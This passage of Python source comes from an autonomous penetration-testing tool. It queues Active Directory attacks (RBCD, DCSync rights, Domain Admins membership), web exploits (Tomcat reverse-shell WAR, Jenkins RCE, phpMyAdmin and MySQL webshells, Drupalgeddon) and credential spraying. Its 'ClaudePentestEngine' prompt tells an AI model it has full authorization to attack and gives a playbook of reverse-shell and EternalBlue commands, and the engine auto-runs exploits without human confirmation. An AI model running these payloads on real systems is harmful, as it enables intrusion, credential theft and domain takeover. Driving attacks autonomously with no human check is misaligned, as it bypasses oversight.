        self._enqueue(2, f"PrinterBug:{dc_ip}",
            f"LHOST={lhost_cmd}; "
            f"python3 /opt/SpoolSample/SpoolSample.py {dc_ip} $LHOST 2>/dev/null | head -10 "
            f"|| impacket-rpcdump @{dc_ip} | grep -i 'spooler\\|print' 2>/dev/null | head -5 "
            f"|| echo 'INFO: PrinterBug requires MS-RPRN (Spooler service running on DC)'",
            dc_ip)

        # After relay: RBCD attack chain
        self._enqueue(3, f"RBCD-Chain:{dc_ip}",
            f"# After ntlmrelayx creates PentestRelay$ machine account:\n"
            f"echo '=== RBCD chain ==='; "
            f"rbcd.py -f 'PentestRelay$' -t '{dc_ip}' -dc-ip {dc_ip} -action write 2>/dev/null | head -10 "
            f"|| impacket-rbcd -f 'PentestRelay' -t {dc_ip} 2>/dev/null | head -10; "
            f"getST.py '{dom}/PentestRelay$:PentestRelay' -spn cifs/{dc_ip} -impersonate administrator -dc-ip {dc_ip} 2>/dev/null | head -15 "
            f"|| impacket-getST '{dom}/PentestRelay$:PentestRelay' -spn cifs/{dc_ip} -impersonate administrator -dc-ip {dc_ip} 2>/dev/null | head -15",
            dc_ip)

    # ── BLOCK 7: Kerberos delegation attacks ──────────────────────────────────
    def _delegation_attacks(self, target, domain, user, pwd, ntlm_hash=""):
        """Enumerate and exploit Kerberos delegation (unconstrained, constrained, RBCD)"""
        dom = domain or self._domain
        if not dom:
            return
        auth = f"-hashes ':{ntlm_hash}'" if ntlm_hash else f"-p '{pwd}'"
        cme_auth = f"--hash '{ntlm_hash}'" if ntlm_hash else f"-p '{pwd}'"

        self._log(f"DELEGATION [{target}] Enumerando delegación Kerberos ({dom})")

        # Find all delegation types
        _base_dn = "DC=" + dom.replace(".", ",DC=")
        self._enqueue(2, f"Delegation-Enum:{target}",
            f"findDelegation.py '{dom}/{user}' {auth} -dc-ip {target} 2>/dev/null | head -30 "
            f"|| impacket-findDelegation '{dom}/{user}:{pwd}' -dc-ip {target} 2>/dev/null | head -30 "
            f"|| ldapsearch -x -H ldap://{target} -D '{user}@{dom}' -w '{pwd}' "
            f"-b '{_base_dn}' "
            f"'(|(userAccountControl:1.2.840.113556.1.4.803:=524288)(userAccountControl:1.2.840.113556.1.4.803:=16777216)(msDS-AllowedToDelegateTo=*))' "
            f"sAMAccountName userAccountControl msDS-AllowedToDelegateTo 2>/dev/null | head -40",
            target)

        # Constrained delegation S4U attack (if we have service account creds)
        self._enqueue(3, f"S4U-Ticket:{target}:{user}",
            f"# S4U2Self + S4U2Proxy for constrained delegation\n"
            f"getST.py '{dom}/{user}:{pwd}' -spn cifs/{target} -impersonate Administrator -dc-ip {target} 2>/dev/null | head -15 "
            f"|| impacket-getST '{dom}/{user}:{pwd}' -spn cifs/{target} -impersonate Administrator -dc-ip {target} 2>/dev/null | head -15",
            target)

        # RBCD setup (if we have GenericWrite on computer object)
        self._enqueue(4, f"RBCD-Setup:{target}",
            f"# RBCD: add computer + set delegation\n"
            f"addcomputer.py '{dom}/{user}:{pwd}' -method LDAPS -computer-name 'RBCDAttack$' "
            f"-computer-pass 'RBCDPassw0rd!' -dc-ip {target} 2>/dev/null | head -10 "
            f"|| impacket-addcomputer '{dom}/{user}:{pwd}' -method LDAPS -computer-name 'RBCDAttack$' "
            f"-computer-pass 'RBCDPassw0rd!' -dc-ip {target} 2>/dev/null | head -10",
            target)

    # ── BLOCK 8: ACL/DACL abuse chain ─────────────────────────────────────────
    def _acl_abuse_chain(self, target, domain, user, pwd, ace_type, victim_account, ntlm_hash=""):
        """Exploit AD ACL paths: GenericAll, WriteDACL, AddMember, ForceChangePassword"""
        dom = domain or self._domain
        if not dom:
            return
        auth = f"-hashes ':{ntlm_hash}'" if ntlm_hash else f"-p '{pwd}'"
        self._log(f"ACL [{target}] Explotando {ace_type} sobre {victim_account}")

        if ace_type.lower() in ("genericall", "genericwrite", "forcechangepassword"):
            self._enqueue(1, f"ACL-ResetPwd:{target}:{victim_account}",
                f"# Reset password via GenericAll/ForceChangePassword\n"
                f"net rpc password '{victim_account}' 'Newpassword1!' -U '{dom}/{user}%{pwd}' -S {target} 2>/dev/null | head -5; "
                f"bloodyAD --host {target} -d '{dom}' -u '{user}' -p '{pwd}' set password '{victim_account}' 'Newpassword1!' 2>/dev/null | head -5 "
                f"|| rpcclient -U '{dom}\\{user}%{pwd}' {target} -c \"setuserinfo2 {victim_account} 23 'Newpassword1!'\" 2>/dev/null | head -3",
                target)

        if ace_type.lower() in ("writedacl", "genericall"):
            self._enqueue(2, f"ACL-GrantDCSync:{target}:{victim_account}",
                f"# Grant DCSync rights via WriteDACL\n"
                f"bloodyAD --host {target} -d '{dom}' -u '{user}' -p '{pwd}' "
                f"add dcsync '{victim_account}' 2>/dev/null | head -5 "
                f"|| python3 /opt/bloodyAD.py --host {target} -d '{dom}' -u '{user}' -p '{pwd}' "
                f"add dcsync '{victim_account}' 2>/dev/null | head -5",
                target)
            # Then DCSync with new rights
            self._enqueue(3, f"DCSync-WithNewRights:{target}:{victim_account}",
                f"impacket-secretsdump -just-dc-user administrator '{dom}/{victim_account}:Newpassword1!@{target}' 2>/dev/null | head -10 "
                f"|| impacket-secretsdump '{dom}/{victim_account}:{pwd}@{target}' -just-dc 2>/dev/null | head -10",
                target)

        if ace_type.lower() in ("addmember", "genericall", "genericwrite"):
            self._enqueue(2, f"ACL-AddToDA:{target}:{victim_account}",
                f"net rpc group addmem 'Domain Admins' '{victim_account}' -U '{dom}/{user}%{pwd}' -S {target} 2>/dev/null | head -3 "
                f"|| bloodyAD --host {target} -d '{dom}' -u '{user}' -p '{pwd}' "
                f"add groupMember 'Domain Admins' '{victim_account}' 2>/dev/null | head -5",
                target)

    # ── BLOCK 4: Web application exploitation ────────────────────────────────
    def _web_exploit(self, target, port, url, app_type, user="", pwd=""):
        at = app_type.lower()

        if at == "tomcat":
            u, p = user or "admin", pwd or "admin"
            # Cred spray if no known creds
            if not user:
                self._enqueue(1, f"Tomcat-Creds:{target}:{port}",
                    f"for u in admin tomcat manager root; do "
                    f"for p in admin tomcat manager password s3cret ''; do "
                    f"CODE=$(curl -s -o /dev/null -w '%{{http_code}}' -u \"$u:$p\" '{url}/manager/html' 2>/dev/null); "
                    f"if [ \"$CODE\" = \"200\" ]; then echo \"TOMCAT_CREDS_VALID:$u:$p\"; break 2; fi; done; done", target)
            # WAR upload RCE
            self._enqueue(2, f"Tomcat-WAR-Upload:{target}:{port}",
                f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f war -o /tmp/t_shell_{port}.war 2>/dev/null && "
                f"curl -s -u '{u}:{p}' '{url}/manager/deploy?path=/shell{port}&update=true' "
                f"--upload-file /tmp/t_shell_{port}.war 2>/dev/null | head -3; "
                f"curl -s '{url}/shell{port}/' 2>/dev/null | head -3", target)

        elif at == "jenkins":
            # Anonymous Groovy script console (many Jenkins have it open)
            self._enqueue(1, f"Jenkins-Anon-RCE:{target}:{port}",
                f"curl -s -X POST '{url}/scriptText' "
                f"-d 'script=println(\"id\".execute().text)' 2>/dev/null | head -5; "
                f"curl -s -X POST '{url}/script' "
                f"--data-urlencode 'script=println([\"id\"].execute().text)' 2>/dev/null | head -5; "
                f"curl -s -X POST '{url}/j_spring_security_check' "
                f"-d 'j_username=admin&j_password=admin&from=%2F&Submit=Sign+in' -c /tmp/jenkins_c -L 2>/dev/null | "
                f"grep -c 'Dashboard\\|Manage Jenkins' | head -1", target)
            self._enqueue(2, f"Jenkins-Auth-RCE:{target}:{port}",
                f"curl -s -b /tmp/jenkins_c -X POST '{url}/scriptText' "
                f"-d 'script=println([\"id\",\"-a\"].execute().text)' 2>/dev/null | head -5; "
                f"curl -s -b /tmp/jenkins_c -X POST '{url}/script' "
                f"--data-urlencode 'script=def cmd=[\"bash\",\"-c\",\"id && cat /root/root.txt 2>/dev/null\"].execute(); println(cmd.text)' 2>/dev/null | head -5", target)

        elif at == "phpmyadmin":
            u2, p2 = user or "root", pwd or ""
            self._enqueue(1, f"phpMyAdmin-Login:{target}:{port}",
                f"for p in '' root toor mysql admin password 123456; do "
                f"R=$(curl -s -c /tmp/pma_c_{port} -b /tmp/pma_c_{port} "
                f"'{url}/phpmyadmin/index.php' "
                f"-d \"pma_username=root&pma_password=$p&server=1\" -L 2>/dev/null); "
                f"if echo \"$R\" | grep -q 'phpMyAdmin' && ! echo \"$R\" | grep -q 'pma_password'; then "
                f"echo \"PHPMYADMIN_CREDS:root:$p\"; break; fi; done", target)
            self._enqueue(2, f"phpMyAdmin-Webshell:{target}:{port}",
                f"curl -s -b /tmp/pma_c_{port} '{url}/phpmyadmin/sql.php' "
                f"--data-urlencode \"sql_query=SELECT '<?php system(\\$_GET[\\\"c\\\"]); ?>' "
                f"INTO OUTFILE '/var/www/html/x.php'\" 2>/dev/null | head -3; "
                f"curl -s '{url}/x.php?c=id' 2>/dev/null | head -3", target)

        elif at == "wp":
            wp_user = user or "admin"
            self._enqueue(2, f"WP-Login-Brute:{target}:{port}",
                f"wpscan --url {url} --enumerate u --passwords /usr/share/wordlists/rockyou.txt "
                f"--usernames {wp_user} --max-threads 10 2>/dev/null | grep -E 'Valid|Found|Confirmed' | head -10", target)

        elif at == "drupal":
            self._enqueue(2, f"Drupalgeddon:{target}:{port}",
                f"curl -s '{url}/?q=user/password&name[%23post_render][]=passthru&name[%23markup]=id&name[%23type]=markup' "
                f"-d 'form_id=user_pass&_triggering_element_name=name' 2>/dev/null | grep -oE 'uid=[0-9]+' | head -3; "
                f"curl -s '{url}/index.php?q=user%2Fpassword&name%%5B%%23post_render%%5D%%5B%%5D=passthru"
                f"&name%%5B%%23markup%%5D=id&name%%5B%%23type%%5D=markup' 2>/dev/null | grep uid | head -2", target)

    def _loop(self):
        cfg = MODE_CONFIG.get(self.mode, MODE_CONFIG["normal"])
        delay = cfg["delay_between_jobs"]
        n_workers = cfg.get("workers", 1)
        job_timeout = cfg.get("job_timeout", 300)
        last_report = time.time()

        # Expand CIDRs
        all_targets = []
        for t in self.targets:
            if "/" in t:
                all_targets.extend(self._ping_sweep(t))
            else:
                all_targets.append(t)

        # Feature 6: OSINT phase before scanning
        for target in all_targets:
            if not self._running:
                break
            self._osint_phase(target)

        # Initial nmap for every target — populates the KB queue
        for target in all_targets:
            if not self._running:
                break
            self._initial_scan(target)
            if delay and self.mode == "stealth":
                time.sleep(delay)

        # BLOCK 1: Launch N worker threads to drain queue in parallel
        self._worker_threads = []
        for _ in range(n_workers):
            wt = threading.Thread(target=self._worker_thread, args=(delay, job_timeout), daemon=True)
            wt.start()
            self._worker_threads.append(wt)
        self._log(f"ENGINE {n_workers} worker(s) paralelos iniciados")

        # Monitor: handle pivots + living report while workers drain queue
        idle_ticks = 0
        while self._running:
            if time.time() - last_report > self.living_report_interval:
                self._living_report()
                last_report = time.time()

            # Feature 10: process pivot targets discovered during exploitation
            if self._pivot_targets:
                idle_ticks = 0
                pivot_batch = list(self._pivot_targets)
                self._pivot_targets.clear()
                for pt in pivot_batch:
                    if pt not in self._all_scanned:
                        self._log(f"PIVOT Escaneando nuevo target: {pt}")
                        self._osint_phase(pt)
                        self._initial_scan(pt)

            # Check completion
            workers_alive = any(w.is_alive() for w in self._worker_threads)
            if self._job_queue.empty() and not self._pivot_targets:
                idle_ticks += 1
                if idle_ticks >= 3 and not workers_alive:
                    break
                if idle_ticks >= 10:
                    break
            else:
                idle_ticks = 0

            time.sleep(2)

        # Signal workers to stop and wait
        self._running = False
        for w in self._worker_threads:
            w.join(timeout=15)

        self._living_report()
        mem = MEMORY.get_stats()
        self._log(
            f"ENGINE Completado — {self.stats['commands_run']} cmds, "
            f"{self.stats['creds_found']} creds, {self.stats['ports_discovered']} puertos | "
            f"Memoria: {mem['known_hosts']} hosts, {mem['verified_creds']} creds verificadas, "
            f"{mem['pivot_networks']} redes pivot")
        self._running = False


# ══════════════════════════════════════════════════════════════════════════════
# CLAUDE AI-DRIVEN AUTOPILOT ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class ClaudePentestEngine:
    """Claude AI-driven autonomous pentesting engine.
    Simple sequential loop: nmap discovery → Claude decides each step → execute → repeat.
    This is the primary engine when ANTHROPIC_API_KEY is set.
    """

    MAX_STEPS = 35

    SYSTEM_PROMPT = """You are an expert autonomous pentester. You have full authorization to attack the target.
Analyze the tool outputs and decide the SINGLE BEST next action.

EXPLOIT PLAYBOOK (use these exact commands when you see these conditions):
- vsftpd 2.3.4: msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS TARGET; set PAYLOAD cmd/unix/interact; run; sleep 10; exit' 2>/dev/null
- Samba<3.0.20: msfconsole -q -x 'use exploit/multi/samba/usermap_script; set RHOSTS TARGET; set PAYLOAD cmd/unix/reverse_netcat; set LHOST LHOST; set LPORT LPORT; run; sleep 15; exit' 2>/dev/null
- MS17-010/EternalBlue: msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS TARGET; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST LHOST; set LPORT LPORT; run; sleep 20; exit' 2>/dev/null
- Tomcat Manager (valid creds found): msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS TARGET; set HttpUsername USER; set HttpPassword PASS; set PAYLOAD java/shell_reverse_tcp; set LHOST LHOST; set LPORT LPORT; run; sleep 15; exit' 2>/dev/null
- Redis no-auth: redis-cli -h TARGET config set dir /var/spool/cron && redis-cli -h TARGET config set dbfilename root && redis-cli -h TARGET set pwn "\\n\\n* * * * * bash -i >&/dev/tcp/LHOST/LPORT 0>&1\\n\\n" && redis-cli -h TARGET save && echo REDIS_RCE_DONE
- MySQL empty root: mysql -h TARGET -u root --password='' -e "SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/html/cmd.php';" 2>/dev/null && echo MYSQL_WEBSHELL
- FTP anonymous login: ftp -n TARGET then download id_rsa, user.txt, flag.txt, .bash_history
- SSH with found creds USER:PASS: sshpass -p 'PASS' ssh -o StrictHostKeyChecking=no USER@TARGET 'id; whoami; cat /etc/passwd; sudo -l; find / -perm -4000 -type f 2>/dev/null | head -20; cat ~/user.txt 2>/dev/null; cat ~/Desktop/user.txt 2>/dev/null'
- Webshell written: curl http://TARGET/cmd.php?cmd=id; curl http://TARGET/cmd.php?cmd=cat+/root/root.txt

POST-EXPLOITATION (when you have a shell):
- Always run: id; whoami; hostname; uname -a; cat /etc/passwd; cat /etc/shadow 2>/dev/null
- Privesc checks: sudo -l; find / -perm -4000 2>/dev/null; cat /etc/crontab; env | grep -i pass
- Get flags: find / -name '*.txt' 2>/dev/null | xargs grep -l 'HTB{\\|flag{\\|root:' 2>/dev/null | head -5

RESPOND ONLY WITH VALID JSON (no markdown, no prose):
{
  "findings": [
    {"title": "exact vuln name", "severity": "critical|high|medium|low|info", "description": "brief technical description", "cve": "CVE-XXXX-XXXX or empty"}
  ],
  "next_action": {
    "type": "command|done",
    "command": "complete shell command ready to execute",
    "tool": "nmap|metasploit|hydra|crackmapexec|enum4linux|nikto|nuclei|curl|ssh|ftp|redis-cli|mysql|other",
    "reason": "1-line justification"
  }
}

PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force credentials > done"""

    def __init__(self, project_id, targets, mode="normal", lhost="", lport="4444", **kwargs):
        self.project_id = project_id
        self.targets = targets
        self.mode = mode
        self.lhost = lhost or self._detect_lhost()
        self.lport = str(lport)
        self._running = False
        self._thread = None
        self._brain_log: list = []
        self._brain_log_lock = threading.Lock()
        self._project_lock = threading.Lock()
        self._started_at = None
        self.stats = {"commands_run": 0, "findings_count": 0, "exploits_run": 0, "ports_discovered": 0}
        self.timeline: list = []
        self.heatmap: dict = {}

    @staticmethod
    def _detect_lhost():
        try:
            import socket as _sock
            with _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
        except Exception:
            return "YOUR_LHOST"

    def _log(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        line = f"[{ts}] {msg}"
        with self._brain_log_lock:
            self._brain_log.append(line)
            if len(self._brain_log) > 2000:
                self._brain_log = self._brain_log[-1500:]

    def _run_cmd(self, name, command, target, timeout=300):
        job_id = str(uuid.uuid4())
        job = {
            "id": job_id, "project_id": self.project_id,
            "tool": f"[Claude] {name}", "phase": "autopilot",
            "command": command, "status": "running", "output": [],
            "started_at": datetime.now().isoformat(), "finished_at": None,
            "pid": None, "return_code": None, "proc": None, "autopilot": True,
        }
        with JOBS_LOCK:
            JOBS[job_id] = job
        _kill_timer = None
        try:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, text=True, bufsize=1)
            job["proc"] = proc
            job["pid"] = proc.pid
            if timeout:
                def _kill(p=proc, n=name, t=timeout):
                    # BUG5 FIX: SIGTERM first, then SIGKILL after 3s for stubborn processes
                    # (nmap --min-rate, msfconsole, hydra often ignore SIGTERM)
                    try:
                        p.terminate()
                    except Exception:
                        pass
                    time.sleep(3)
                    try:
                        if p.poll() is None:
                            p.kill()
                    except Exception:
                        pass
                    self._log(f"TIMEOUT+KILLED {n} (>{t}s)")
                _kill_timer = threading.Timer(timeout, _kill)
                _kill_timer.start()
            for line in proc.stdout:
                job["output"].append(line.rstrip("\n"))
                if not self._running:
                    try:
                        proc.terminate()
                        time.sleep(1)
                        if proc.poll() is None:
                            proc.kill()
                    except Exception:
                        pass
                    break
            proc.wait()
            job["return_code"] = proc.returncode
            job["status"] = "completed" if proc.returncode == 0 else "error"
        except Exception as e:
            job["output"].append(f"[ERROR] {e}")
            job["status"] = "error"
        finally:
            if _kill_timer:
                _kill_timer.cancel()
            job["finished_at"] = datetime.now().isoformat()
            job.pop("proc", None)
        self.stats["commands_run"] += 1
        output = "\n".join(job["output"])
        self.timeline.append({
            "name": name, "target": target,
            "start": job["started_at"], "end": job["finished_at"],
            "status": job["status"],
        })
        return output, job_id

    def _ask_claude(self, tool_output, target, context_summary):
        api_key = os.environ.get("ANTHROPIC_API_KEY", "")
        if not api_key:
            return None
        user_msg = (
            f"TARGET: {target}\nLHOST: {self.lhost}\nLPORT: {self.lport}\n\n"
            f"CUMULATIVE PENTEST CONTEXT:\n{context_summary[:2500]}\n\n"
            f"TOOL OUTPUT TO ANALYZE:\n{tool_output[:5000]}\n\n"
            "Based on all the above: identify any vulnerabilities found, then decide the best "
            "next action. Replace TARGET/{self.lhost}/{self.lport} placeholders in commands. "
            "If exploitation was confirmed or nothing more to do, set type=done."
        ).replace("{self.lhost}", self.lhost).replace("{self.lport}", self.lport)
        try:
            import urllib.request
            payload = json.dumps({
                "model": "claude-haiku-4-5-20251001",
                "max_tokens": 1024,
                "system": self.SYSTEM_PROMPT,
                "messages": [{"role": "user", "content": user_msg}],
            }).encode()
            req = urllib.request.Request(
                "https://api.anthropic.com/v1/messages",
                data=payload,
                headers={
                    "x-api-key": api_key,
                    "anthropic-version": "2023-06-01",
                    "content-type": "application/json",
                },
            )
            with urllib.request.urlopen(req, timeout=30) as resp:
                body = json.loads(resp.read())
            text = body["content"][0]["text"].strip()
            text = re.sub(r'^```(?:json)?\s*', '', text, flags=re.MULTILINE)
            text = re.sub(r'\s*```$', '', text, flags=re.MULTILINE)
            return json.loads(text)
        except Exception as e:
            self._log(f"CLAUDE API ERROR: {e}")
            return None

    def _save_findings(self, findings, target):
        if not findings:
            return
        to_exploit = []
        with self._project_lock:
            project = read_project(self.project_id)
            if not project:
                return
            existing = {f.get("title", "") for f in project.get("findings", [])}
            now_iso = datetime.now().isoformat()
            vars_dict = {"lhost": self.lhost, "lport": self.lport}
            added = 0
            for f in findings:
                title = f.get("title", "")
                if not title or title in existing:
                    continue
                f["id"] = str(uuid.uuid4())
                f["status"] = "open"
                f["hosts"] = [target]
                f["created_at"] = now_iso
                f["source"] = "claude-autopilot"
                _enrich_finding_cvss(f)
                _auto_mitre_tag(f)
                _auto_remediation(f)
                _attach_msf_command(f, target, vars_dict)
                # T3 H3: compliance auto-tagging — use self directly (avoids cross-dict lookup bug)
                if hasattr(self, '_auto_compliance_tag'):
                    self._auto_compliance_tag(f)
                project.setdefault("findings", []).append(f)
                existing.add(title)
                added += 1
                # Queue auto-exploit for critical/high findings with known MSF module
                if f.get("exploit_cmd") and f.get("severity") in ("critical", "high"):
                    to_exploit.append(f)
            if added:
                write_project(project)
                self.stats["findings_count"] += added
                self._log(f"CLAUDE [{target}] +{added} findings guardados")
        # Auto-run exploits outside the lock
        for f in to_exploit:
            exploit_cmd = f.get("exploit_cmd", "")
            if "use exploit/" not in exploit_cmd and "use auxiliary/" not in exploit_cmd:
                continue
            title = f.get("title", "")[:60]
            self._log(f"[Claude] AUTO-EXPLOIT finding: {title}")
            lines = [l.strip() for l in exploit_cmd.splitlines() if l.strip()]
            msf_inner = "; ".join(lines)
            msf_cmd = f"msfconsole -q -x '{msf_inner}; sleep 15; exit' 2>/dev/null"
            out, _ = self._run_cmd(f"autoexploit-{re.sub(r'[^a-z0-9]','_',title.lower())[:30]}",
                                   msf_cmd, target, timeout=120)
            self._capture_evidence(out, target, f"autoexploit:{title}", msf_cmd)
            self.stats["exploits_run"] += 1

    def _save_ports(self, output, target):
        parsed = _parse_tool_output("nmap", output, target, "nmap")
        open_ports = parsed.get("open_ports", [])
        if not open_ports:
            return open_ports
        with self._project_lock:
            project = read_project(self.project_id)
            if not project:
                return open_ports
            existing = {(p.get("host", ""), p.get("port")) for p in project.get("ports", [])}
            now_iso = datetime.now().isoformat()
            for p in open_ports:
                if (target, p["port"]) not in existing:
                    project.setdefault("ports", []).append({
                        "host": target, "port": p["port"],
                        "proto": p.get("proto", "tcp"),
                        "service": p["service"], "version": p["version"],
                        "timestamp": now_iso,
                    })
                    existing.add((target, p["port"]))
                    MEMORY.remember_host(target, p["port"], p["service"], p["version"])
            write_project(project)
        self.stats["ports_discovered"] += len(open_ports)
        return open_ports

    def _capture_evidence(self, output, target, name, command):
        EXPLOIT_MARKERS = [
            (r'uid=0\(root\)', "RCE Confirmado — Shell como root", "critical", "", 10.0),
            (r'uid=\d+\(\w+\).*gid=\d+', "RCE Confirmado — Ejecución de Comandos", "critical", "", 9.8),
            (r'Pwn3d!', "Acceso Admin Confirmado (Pwn3d!)", "critical", "", 9.8),
            (r'Administrator:500:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}', "Hashes NTLM Volcados", "critical", "", 9.0),
            (r'meterpreter\s+>', "Meterpreter Shell Abierta", "critical", "", 10.0),
            (r'Command shell session.*opened', "Shell Reversa via Metasploit", "critical", "", 10.0),
            (r'root\.txt[:\s]+[a-fA-F0-9]{32}', "Flag Root Capturada", "critical", "", 10.0),
            (r'230 Login successful', "FTP Anonymous Login Confirmado", "high", "", 7.5),
            (r'vsftpd.*backdoor|VSFTPD_BACKDOOR', "vsftpd 2.3.4 Backdoor RCE", "critical", "", 10.0),
        ]
        for pattern, title, severity, cve, cvss in EXPLOIT_MARKERS:
            if re.search(pattern, output, re.IGNORECASE | re.DOTALL):
                with self._project_lock:
                    project = read_project(self.project_id)
                    if not project:
                        return
                    full_title = f"[Exploit] {title} @ {target}"
                    if full_title not in {f.get("title") for f in project.get("findings", [])}:
                        finding = {
                            "id": str(uuid.uuid4()),
                            "title": full_title,
                            "severity": severity, "status": "open",
                            "cve": cve, "cvss": cvss,
                            "description": f"Exploitation confirmed by Claude Autopilot in step '{name}'.",
                            "evidence": f"Command: {command}\n\nOutput:\n{output[:3000]}",
                            "hosts": [target], "source": "claude-autopilot",
                            "created_at": datetime.now().isoformat(),
                        }
                        _auto_mitre_tag(finding)
                        project.setdefault("findings", []).append(finding)
                        write_project(project)
                        self.stats["findings_count"] += 1
                        self._log(f"EVIDENCE [{target}] {title}")
                break

    def _update_attack_path(self, target, open_ports):
        try:
            proj = read_project(self.project_id)
            if not proj:
                return
            ap = proj.get("attack_path", {"nodes": [], "edges": []})
            ids = {n["id"] for n in ap["nodes"]}
            if "attacker" not in ids:
                ap["nodes"].append({"id": "attacker", "label": "Attacker", "color": "#3fb950", "shape": "box"})
            if target not in ids:
                ap["nodes"].append({"id": target, "label": target, "color": "#f0883e", "shape": "ellipse"})
                ap["edges"].append({"from": "attacker", "to": target, "label": "scan"})
                ids.add(target)
            for p in open_ports:
                sid = f"{target}:{p['port']}"
                if sid not in ids:
                    color = "#f85149" if p["port"] in (445, 22, 3389, 21, 3306, 6379, 27017) else "#58a6ff"
                    ap["nodes"].append({"id": sid, "label": f"{p['service']}\n:{p['port']}", "color": color, "shape": "box"})
                    ap["edges"].append({"from": target, "to": sid, "label": str(p["port"])})
                    ids.add(sid)
            proj["attack_path"] = ap
            with self._project_lock:
                write_project(proj)
        except Exception:
            pass

    def _credential_chain(self, target, open_ports, creds, accumulated_output):
        """Take found credentials and try them against every applicable service."""
        if not creds:
            return
        port_set = {p["port"] for p in open_ports}
        for cred in creds[:10]:
            if ":" not in cred:
                continue
            user, pwd = cred.split(":", 1)
            self._log(f"[Claude] CRED-CHAIN {user}:{pwd[:4]}*** → probando en {len(port_set)} servicios")
            MEMORY.remember_cred(target, "found", user, pwd)
            # SSH
            if 22 in port_set:
                out, _ = self._run_cmd(
                    f"cred-ssh-{user}",
                    f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
                    f"-o BatchMode=no {user}@{target} "
                    f"'id; whoami; uname -a; cat /etc/passwd; sudo -l 2>/dev/null; "
                    f"find / -perm -4000 -type f 2>/dev/null | head -15; "
                    f"cat ~/user.txt ~/flag.txt /root/root.txt 2>/dev/null' 2>/dev/null",
                    target, timeout=30,
                )
                self._capture_evidence(out, target, f"cred-ssh-{user}", f"ssh {user}@{target}")
                if "uid=" in out or "permission denied" not in out.lower():
                    accumulated_output.append(f"=== SSH {user} ===\n{out[:600]}")
                    # Full post-exploitation chain
                    self._post_exploit_chain(target, user, pwd, accumulated_output)
            # SMB
            if 445 in port_set or 139 in port_set:
                out, _ = self._run_cmd(
                    f"cred-smb-{user}",
                    f"crackmapexec smb {target} -u '{user}' -p '{pwd}' --shares 2>/dev/null | head -20",
                    target, timeout=20,
                )
                self._capture_evidence(out, target, f"cred-smb-{user}", f"cmx smb {user}")
                if "+" in out or "pwn3d" in out.lower():
                    accumulated_output.append(f"=== SMB {user} ===\n{out[:400]}")
                    self._windows_post_exploit(target, user, pwd, out, accumulated_output)
            # WinRM
            if 5985 in port_set or 5986 in port_set:
                out, _ = self._run_cmd(
                    f"cred-winrm-{user}",
                    f"crackmapexec winrm {target} -u '{user}' -p '{pwd}' 2>/dev/null | head -10",
                    target, timeout=20,
                )
                self._capture_evidence(out, target, f"cred-winrm-{user}", f"winrm {user}")
                if "+" in out or "pwn3d" in out.lower():
                    accumulated_output.append(f"=== WinRM {user} ===\n{out[:400]}")
                    # If WinRM works, get a full shell
                    shell_out, _ = self._run_cmd(
                        f"evil-winrm-{user}",
                        f"evil-winrm -i {target} -u '{user}' -p '{pwd}' "
                        f"-e 'cmd /c id & cmd /c whoami & cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt 2>nul' 2>/dev/null | head -20",
                        target, timeout=40,
                    )
                    self._capture_evidence(shell_out, target, f"evil-winrm-{user}", "evil-winrm")
            # MySQL
            if 3306 in port_set:
                out, _ = self._run_cmd(
                    f"cred-mysql-{user}",
                    f"mysql -h {target} -u '{user}' -p'{pwd}' -e 'show databases; select user,host from mysql.user;' 2>/dev/null | head -20",
                    target, timeout=15,
                )
                if "database" in out.lower():
                    accumulated_output.append(f"=== MySQL {user} ===\n{out[:400]}")
            # FTP
            if 21 in port_set:
                out, _ = self._run_cmd(
                    f"cred-ftp-{user}",
                    f"timeout 15 ftp -n {target} <<'FTPEOF'\nuser {user} {pwd}\nls -la\nget user.txt /tmp/ftp_{target.replace('.','_')}_{user}_user.txt\nget root.txt /tmp/ftp_{target.replace('.','_')}_{user}_root.txt\nquit\nFTPEOF\n2>/dev/null; "
                    f"cat /tmp/ftp_{target.replace('.','_')}_{user}_user.txt 2>/dev/null; "
                    f"cat /tmp/ftp_{target.replace('.','_')}_{user}_root.txt 2>/dev/null",
                    target, timeout=20,
                )
                self._capture_evidence(out, target, f"cred-ftp-{user}", f"ftp {user}")
                if "230" in out or out.strip():
                    accumulated_output.append(f"=== FTP {user} ===\n{out[:400]}")

    def _run_kb_phase(self, target, open_ports, accumulated_output):
        """Run highest-priority KB commands for each discovered service."""
        for p in open_ports[:15]:
            if not self._running:
                break
            port_num = p["port"]
            svc = p["service"].lower()
            ver = p["version"].lower()
            kb = _kb_commands(port_num, svc, ver, target, self.mode)
            # Run top-5 highest-priority commands per service (priority ≤ 28)
            priority_cmds = sorted([c for c in kb if c[0] <= 28], key=lambda x: x[0])[:5]
            for pri, name, cmd in priority_cmds:
                if not self._running:
                    break
                self._log(f"[Claude] KB {name}")
                out, _ = self._run_cmd(name, cmd, target, timeout=150)
                parsed = _parse_tool_output(name.split(":")[0].lower(), out, target, name)
                if parsed.get("findings"):
                    self._save_findings(parsed["findings"], target)
                # Extract credentials from output and chain them
                creds_found = re.findall(
                    r'(?:TOMCAT_CREDS_VALID|HYDRA_CRED|Hydra.*login:|valid.*credentials?)[:\s]+(\S+:\S+)',
                    out, re.IGNORECASE,
                )
                creds_found += re.findall(
                    r'(?:\[\+\].*|Pwn3d!.*?)(\w+):(\w+)', out
                )[:3]
                flat_creds = [f"{c[0]}:{c[1]}" if isinstance(c, tuple) else c for c in creds_found]
                if flat_creds:
                    self._log(f"[Claude] KB CREDS encontradas en {name}: {flat_creds[:3]}")
                    self._credential_chain(target, open_ports, flat_creds, accumulated_output)
                # Auto-crack any hashes found in output
